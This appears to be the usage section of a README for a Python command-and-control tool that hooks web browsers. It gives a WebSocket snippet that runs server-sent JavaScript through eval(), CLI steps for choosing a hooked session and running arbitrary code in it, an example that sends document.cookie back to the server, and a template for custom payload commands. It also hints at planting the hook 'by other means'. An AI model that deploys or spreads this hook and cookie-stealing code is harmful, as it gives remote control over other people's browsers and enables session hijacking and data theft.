## Usage
If you run `python main.py`, then run in the CLI:

`>listen`

It will listen for connections. 
To connect a browser, run this in the console (or by other means? :) ):
```
var socket = new WebSocket('ws://localhost:1337', 'chat'); 
socket.onmessage = function (event) {
    eval(event.data);
}
```

Then, in the CLI:

`>control`

`>[the number label of the session you wish to control]`

Then you will be prompted to run any Javascript you want.
To send data back to the server, you can use `socket.send`. E.g.:

```javascript
socket.send(document.cookie);
```

### Custom Commands

See commands.py for implementations of custom commands for the Javascript interpreter. They support multiple command arguments and are easy to implement!

```python
# commands.py
class CommandExample(CMD):

    def __init__(self):
        super(CommandExample, self).__init__(
              "ExampleTitle",
              "commandcall",
              "Description of this example commmand")

    def get_payload(self):
        # You have access to self.argv[] for the argument array (self.argv[0] is the call)
        return "[Javascript to run]"

